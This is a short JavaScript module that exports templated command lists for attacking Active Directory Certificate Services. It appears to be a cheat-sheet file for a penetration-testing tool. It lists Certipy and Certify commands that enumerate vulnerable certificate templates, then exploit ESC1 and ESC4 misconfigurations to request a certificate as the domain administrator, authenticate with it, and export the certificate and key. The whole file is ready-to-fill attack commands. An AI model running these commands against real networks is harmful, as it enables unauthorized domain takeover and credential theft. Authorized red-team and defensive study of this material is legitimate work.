export const adcsCommands = {
    enumeration: {
        description: "Enumerate certificate services and find vulnerable templates (ESC1-ESC8).",
        commands: [
            // Certipy — enumerate all CAs and templates
            "certipy find -u {{UPN}} -p '{{PASSWORD}}' -dc-ip {{DC_IP}} -stdout",
            "certipy find -u {{UPN}} -p '{{PASSWORD}}' -dc-ip {{DC_IP}} -vulnerable -stdout",
            // Certify (.NET — run on Windows)
            "Certify.exe find /vulnerable",
            "Certify.exe cas"
        ]
    },
    exploitation: {
        description: "Exploit ADCS misconfigurations (ESC1, ESC4, etc.) for privilege escalation.",
        commands: [
            // ESC1 — enroll in vulnerable template requesting admin UPN
            "certipy req -u {{UPN}} -p '{{PASSWORD}}' -dc-ip {{DC_IP}} -target {{DC_IP}} -template VulnerableTemplate -upn administrator@{{DOMAIN}}",
            // ESC4 — write privileges on template
            "certipy template -u {{UPN}} -p '{{PASSWORD}}' -dc-ip {{DC_IP}} -template VulnerableTemplate -save-old",
            // Authenticate with obtained certificate
            "certipy auth -pfx administrator.pfx -dc-ip {{DC_IP}}"
        ]
    },
    postExploitation: {
        description: "Post-exploitation certificate operations.",
        commands: [
            "certipy cert -pfx administrator.pfx -nokey -out admin_cert.crt",
            "certutil -exportPFX -p '{{PASSWORD}}' my <cert_serial> output.pfx"
        ]
    }
};